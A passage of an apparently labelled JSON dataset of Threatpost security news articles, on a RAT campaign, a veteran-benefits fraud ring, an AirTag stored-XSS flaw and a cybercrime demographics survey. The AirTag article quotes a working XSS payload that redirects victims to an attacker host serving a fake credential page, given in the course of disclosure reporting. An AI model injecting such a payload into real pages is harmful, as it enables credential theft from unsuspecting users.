sites attackers set up.\n“So far, we’ve observed the delivery of three types of payloads from the remote locations discovered in this phase of the campaign: DcRAT, QuasarRAT and a legitimate copy of the remote desktop client AnyDesk,” Malhotra wrote.\nThe use of the last payload “indicates a focus on manual operations where the actor would have logged into the infected devices to discern if the access was of any value,” according to the writeup.\nAll in all, the tactics of the APT used in the campaign demonstrate “aggressive proliferation” as the goal, as the use of out-of-the-box malware combined with customized file infections gives them a straightforward point of entry onto a victim’s network, Malhotra observed.\n“Organizations should remain vigilant against such threats that are highly motivated to proliferate using automated mechanisms,” he wrote.\nHowever, it seems likely that the group will eventually abandon its use of commodity malware for its own bespoke tools, which means there will probably be more threat campaigns in its future, researchers said.\nCheck out our free upcoming live and on-demand online town halls – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nGovernment\nMalware\nMobile Security\nVulnerabilities\nWeb Security",
        "label": 0
    },
    {
        "title": "Transnational Fraud Ring Bilks U.S. Military Service Members Out of Millions",
        "author": "Tara Seals",
        "date": "October 4, 2021 11:22 am",
        "text": "A former medical records tech stole PII that was then used to fraudulently claim DoD and VA benefits, particularly targeting disabled veterans.\nMore than 3,300 U.S. military service members, military dependents and civilians employed by the Department of Defense were compromised as part of a transnational cybercrime ring created to defraud them out of $1.5 million in military benefits from the DoD and the Department of Veterans Affairs.\nA former civilian medical records technician and administrator with the U.S. Army was at the center of the scheme, according to court documents filed in the U.S. District Court for the Western District of Texas. Fredrick Brown, a Las Vegas resident, was sentenced to 12 and a half years in prison last week, after admitting that between July 2014 and September 2015, he stole personally identifiable information (PII) for thousands of people.\nIn his capacity as a records technician, Brown had access to a military electronic health records database. He admitted that he took screenshots to pilfer names, Social-Security numbers, military ID numbers, dates of birth and contact information from the victims.\nHe sent the information to a Philippines-based co-defendant, Robert Wayne Boling Jr., he said. Boling and associates then used the data to access DoD and benefits sites and steal millions of dollars, according to the court documents.\nAs part of its nefarious work, the ring particularly targeted disabled veterans, who were selected because they were eligible for more service-related benefits, court officials said.\n“The defendant brazenly preyed on and victimized U.S. servicemembers and veterans, many of whom were disabled and elderly,” said U.S. Attorney Ashley C. Hoff for the Western District of Texas, in a media statement. “As part of our mission, we strive to protect these honorable men and women from fraud and abuse. If fraudsters target our servicemembers and veterans, we will seek to identify them and hold them accountable. This office will continue to zealously investigate and prosecute perpetrators of these schemes.”\nIn addition to 151 months of prison time, Chief Judge Orlando Garcia ordered Brown to pay $2.3 million in restitution. He’ll also be placed on supervised release for three years after he gets out.\n“Rather than honoring those servicemembers and veterans who sacrifice for them, the defendant and his co-conspirators targeted and stole from these brave men and women in a years-long fraud scheme,” said Acting Assistant Attorney General Brian Boynton of the Justice Department’s Civil Division. “Such conduct is an affront to the United States and will not be tolerated.”\nThe efforts to bring the ring’s participants to justice are ongoing: In July 2020, Garcia sentenced Brown co-defendant and accomplice Trorice Crawford to 46 months in federal prison, a fine of $103,700 and a three-year supervised release post-jail. Brown worked with Crawford to recruit money mules — individuals who would deposit the stolen funds into their bank accounts and then send the funds through international wire remittance services to the fraudsters in a money-laundering operation, according to the court..\nU.S. service members have been victims of PII exposure in the past. In May for example, a database filled with the medical records of nearly 200,000 U.S. military veterans was exposed online by a vendor working for the VA, and an analyst found that it might have been exfiltrated by ransomware attackers.\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nBreach\nGovernment\nPrivacy\nWeb Security",
        "label": 0
    },
    {
        "title": "Apple AirTag Zero-Day Weaponizes Trackers",
        "author": "Tara Seals",
        "date": "September 29, 2021 4:48 pm",
        "text": "Apple’s personal item-tracker devices can be used to deliver malware, slurp credentials, steal tokens and more thanks to XSS.\nAn unpatched stored cross-site scripting (XSS) bug in Apple’s AirTag “Lost Mode” could open up users to a cornucopia of web-based attacks, including credential-harvesting, click-jacking, malware delivery, token theft and more.\nThat’s according to Bobby Rauch, an independent security researcher who said that it’s possible to use the zero-day to fully weaponize an AirTag, with the ability to attack random strangers (or specific targets) should they interact with it.\nStored XSS, also known as persistent XSS, occurs when a malicious script is injected directly into a vulnerable web application. An attack then only requires that a victim visit a compromised web page.\nA word about how AirTags work: Apple’s AirTags are personal tracking devices that can be attached to keys, backpacks and other items. If an AirTagged item is lost and nearby, a user can “ping” the AirTag, which will emit a sound and allow it to be tracked down. If it’s further afield (left behind in a restaurant, etc.), the AirTag sends out a secure Bluetooth signal that can be detected by nearby devices in Apple’s Find My network (which has had its own issues in the past). These devices send the location of the AirTag to iCloud — and the user can open the Find My app and see the lost item on a map.\nThe Lost Mode function goes hand in hand with the further-afield function. If an AirTag doesn’t show up in the Find My app, a user can mark the AirTag as missing, and will get an alert if it’s later picked up by the Find My network.\nBut the problematic part of Lost Mode has to do with a different perk: If a stranger finds an AirTag in Lost Mode and scans it via near-field communication (NFC), it generates a unique https://found.apple.com page, which contains its serial number, phone number and a personal message for anyone discovering it. The idea is to let people “turn in” missing items to their rightful owners.\nThe issue, according to Rauch, is that these pages don’t have protection for stored XSS – so, an attacker can inject a malicious payload into the AirTag using the Lost Mode phone number field.\nIn one attack scenario, cybercriminals can use XSS code to redirect victims to the attacker’s fake iCloud page, which has a keylogger installed to capture their credentials.\n“A victim will believe they are being asked to sign into iCloud so they can get in contact with the owner of the AirTag, when in fact, the attacker has redirected them to a credential-hijacking page,” Rauch said in a Tuesday posting. “”Since AirTags were recently released, most users would be unaware that accessing the https://found.apple.com page doesn’t require authentication at all.”\nHe added, “An attacker can create weaponized AirTags and leave them around, victimizing innocent people who are simply trying to help a person find their lost AirTag.”\nRauch provided an example malicious payload to be entered into the phone number field: “<script>window.location=’https://10.0.1.137:8000/indexer.html’;var a = ”;</script>”. He also noted that AirTags could be weaponized to carry out all sorts of attacks.\n“[This is] only one example of the dangers of stored XSS,” he wrote. “There are countless ways an attacker could victimize an end user who discovers a lost AirTag…The https://found.apple.com link can also be used as a phishing link, and shared via a desktop/laptop, without the need for a mobile device to scan the AirTag. Further injection attacks could occur through the Find My App, which is used to scan third-party devices that support ‘Lost Mode’ as part of Apple’s Find My network.”\nThe bug has yet to be patched, although Rauch told security journalist Brian Krebs that he reported it to Apple on June 20. Last week, the company told him that it was planning to patch “in an upcoming update.”\nAbsent a timeline for a fix or any response to his multiple questions about credit and acknowledgement, Rauch told Krebs he decided to go public.\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nIoT\nMalware\nVulnerabilities\nWeb Security",
        "label": 0
    },
    {
        "title": "Women, Minorities Are Hacked More Than Others",
        "author": "Tara Seals",
        "date": "September 27, 2021 2:27 pm",
        "text": "Income level, education and being part of a disadvantaged population all contribute to cybercrime outcomes, a survey suggests.\nLower-income and vulnerable populations are disproportionally affected by cybercrime, according to a new survey, which uncovered that demographics play a big role in how often individuals are targeted.\nThe survey results released Monday (from Malwarebytes, Digitunity and Cybercrime Support Network) suggest that minority groups and those with lower incomes and lower education levels are more likely to fall victim to a cyberattack, and some groups are far more likely to encounter online threats.\nFor instance, more women receive text messages from unknown numbers that include potentially malicious links than men (79 percent compared with 73 percent). And almost half (46 percent) of women said they have had their social-media accounts hacked, compared with 37 percent of men.\nSimilarly, more Black people, indigenous people and people of color (BIPOC) have their social-media accounts attacked more often than white people do (45 percent compared with 40 percent); and BIPOC populations also face identity theft more often (21 percent compared with 15 percent). In fact, only 47 percent of BIPOC respondents avoided the financial repercussions of cybercrime, compared with 59 percent of all respondents, making BIPOC respondents the hardest hit financially by cyber-activity.\nAge is a factor, too: People aged 65 years or older account for 36 percent of credit-card information theft occurrences – far more than any other age group.\nCybercrime Stress\nThere’s an interesting emotional dimension to the findings as well – one-fifth of women (21 percent) and 23 percent of BIPOC respondents said they experienced “substantial” stress in dealing with online suspicious activity, compared with 17 percent of all respondents.\nThe statistic is related to general feelings of safety (or lack thereof) in the cyberspace realm, according to the report. While half of all respondents said they don’t feel private online, and 31 percent don’t feel safe online, the numbers are skewed for women: Women feel the least private online (53 percent compared with 47 percent of men); they also feel the least safe (35 percent compared with 27 percent of men).\nSocioeconomic class matters as well. Individuals with a higher income (51 percent) feel safer online than individuals with a lower income (40 percent). The same pattern holds true for education level: Users who have the highest level of education feel more secure (48 percent) than those who completed only university or college (44 percent) or online high school or secondary school (40 percent), the survey found.\nPeople with a low-level income were also significantly more stressed (18 percent) than those in high-level income circumstances (13 percent). However, higher-income respondents said they lost a median of about $2,108, compared with lower-income respondents who lost about $1,311.\n“The unfortunate finding from this data points to one possible answer: The more money you make, the more comfortable you are online, even if you lose more of that money to an attack,” according to the report. “Money, it appears, plays an enormous role in feeling safe and private online.”\nSource: Malwarebytes.\n“Understanding the impact that cybercrime has on vulnerable people (or populations), particularly women and minorities, across the world is critical as online access becomes essential to modern life,” Marcin Kleczynski, CEO of Malwarebytes, said in a press statement. “The disparity between populations feeling safe online and the emotional impact of threats on already vulnerable communities is unacceptable…As an industry, we need to work together to make safe internet access available to everyone, regardless of income or their ability to pay.”\nIt should be said that none of the respondents were successful in completely avoiding suspicious online activity, no matter their gender, race, age, income or education level.\n“As technology and internet accessibility become more entwined in our day-to-day routines, our financial and emotional lives are more significantly impacted by cybercrime,” Robert Burda, interim CEO at Cybercrime Support Network, said in a press statement. “With a greater understanding of how the digital world impacts disadvantaged communities, we can provide better programs and resources that meet people where they are.”\nThe firms polled 5,000 people in Germany, the United Kingdom and the United States.\nRule #1 of Linux Security: No cybersecurity solution is viable if you don’t have the basics down. JOIN Threatpost and Linux security pros at Uptycs for a LIVE roundtable on the 4 Golden Rules of Linux Security. Your top takeaway will be a Linux roadmap to getting the basics right! REGISTER NOW and join the LIVE event on Sept. 29 at Noon EST. Joining Threatpost is Uptycs’ Ben Montour and Rishi Kant who will spell out Linux security best practices and take your most pressing questions in real time.\n  Write a comment\nShare this article:\nBreach\nHacks\nMalware\nMobile Security\nMost Recent ThreatLists\nPrivacy\nWeb Security",
        "label": 0
    }
]